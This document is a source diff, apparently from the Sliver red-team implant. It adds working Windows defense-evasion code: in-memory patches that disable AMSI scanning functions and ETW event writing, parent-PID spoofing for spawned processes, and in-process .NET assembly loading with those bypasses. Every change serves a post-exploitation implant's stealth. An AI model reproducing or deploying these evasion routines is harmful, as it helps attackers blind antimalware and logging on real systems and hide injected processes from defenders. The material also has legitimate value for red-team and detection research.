@@ -31,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"syscall"
 	// {{if .Config.Evasion}}
 	"github.com/bishopfox/sliver/implant/sliver/evasion"
@@ -199,12 +200,102 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(data []byte, process string) (string, error) {
+func patchAmsi() error {
+	// load amsi.dll
+	amsiDLL := windows.NewLazyDLL("amsi.dll")
+	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
+	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
+	amsiScanString := amsiDLL.NewProc("AmsiScanString")
+
+	// patch
+	amsiAddr := []uintptr{
+		amsiScanBuffer.Addr(),
+		amsiInitialize.Addr(),
+		amsiScanString.Addr(),
+	}
+	patch := byte(0xC3)
+	for _, addr := range amsiAddr {
+		// skip if already patched
+		if *(*byte)(unsafe.Pointer(addr)) != patch {
+			// {{if .Config.Debug}}
+			log.Println("Patching AMSI")
+			// {{end}}
+			var oldProtect uint32
+			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect failed:", err)
+				//{{end}}
+				return err
+			}
+			*(*byte)(unsafe.Pointer(addr)) = 0xC3
+			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect (restauring) failed:", err)
+				//{{end}}
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+func patchEtw() error {
+	ntdll := windows.NewLazyDLL("ntdll.dll")
+	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
+
+	// patch
+	patch := byte(0xC3)
+	// skip if already patched
+	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
+		// {{if .Config.Debug}}
+		log.Println("Patching ETW")
+		// {{end}}
+		var oldProtect uint32
+		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect failed:", err)
+			//{{end}}
+			return err
+		}
+		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
+		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect (restauring) failed:", err)
+			//{{end}}
+			return err
+		}
+	}
+	return nil
+}
+
+func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
+	if amsiBypass {
+		err := patchAmsi()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	if etwBypass {
+		err := patchEtw()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
+}
+
+func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
 	var (
 		stdoutBuf, stderrBuf bytes.Buffer
 		lpTargetHandle       windows.Handle
 	)
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
+	cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", process)
@@ -252,7 +343,7 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
-func SpawnDll(procName string, data []byte, offset uint32, args string, kill bool) (string, error) {
+func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args string, kill bool) (string, error) {
 	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
@@ -261,7 +352,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
 	// 1 - Start process
-	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
+	cmd, err := startProcess(procName, processArgs, ppid, &stdoutBuff, &stderrBuff, true)
 	if err != nil {
 		return "", err
 	}
@@ -327,9 +418,9 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	return "", nil
 }
 
-//SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
-	return SpawnDll(procName, data, 0, "", kill)
+// SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args string, kill bool) (string, error) {
+	return SpawnDll(procName, procArgs, ppid, data, 0, "", kill)
 }
 
 // Util functions
@@ -358,20 +449,30 @@ func refresh() error {
 	return nil
 }
 
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
-	cmd := exec.Command(proc)
+func startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
+	var cmd *exec.Cmd
+	if len(args) > 0 {
+		cmd = exec.Command(proc, args...)
+	} else {
+		cmd = exec.Command(proc)
+	}
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(CurrentToken),
+		Token:      syscall.Token(CurrentToken),
+		HideWindow: true,
+	}
+	err := spoof.SpoofParent(ppid, cmd)
+	if err != nil {
+		// We couldn't spoof the parent, fail open and continue
+		//{{if .Config.Debug}}
+		log.Printf("could not spoof parent PID: %v\n", err)
+		//{{end}}
 	}
 	cmd.Stdout = stdout
 	cmd.Stderr = stderr
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		HideWindow: true,
-	}
 	if suspended {
 		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
 	}
-	err := cmd.Start()
+	err = cmd.Start()
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", proc)
